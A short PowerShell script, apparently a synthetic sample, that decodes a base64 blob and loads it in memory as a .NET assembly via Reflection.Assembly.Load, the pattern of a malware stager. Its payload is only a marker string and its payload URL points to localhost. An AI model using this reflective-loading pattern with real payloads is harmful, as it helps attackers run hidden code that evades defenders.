
[CmdletBinding()]
param(
    [string]$PayloadUrl = 'https://127.0.0.1/payload.bin',
    [int]$TimeoutSec = 32
)
$ErrorActionPreference = "Stop"

try {
    $PayloadBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjo3ZmFsb204cTY4')
    Write-Verbose ("Assembly byte count: " + $PayloadBytes.Length)
    $OperationResult = [Reflection.Assembly]::Load($PayloadBytes)
    if ($null -ne $OperationResult) {
        Write-Verbose ("Loaded assembly: " + $OperationResult.FullName)
    }
}
catch {
    Write-Warning "Assembly load failed: $($_.Exception.Message)"
}

Start-Sleep -Seconds 4
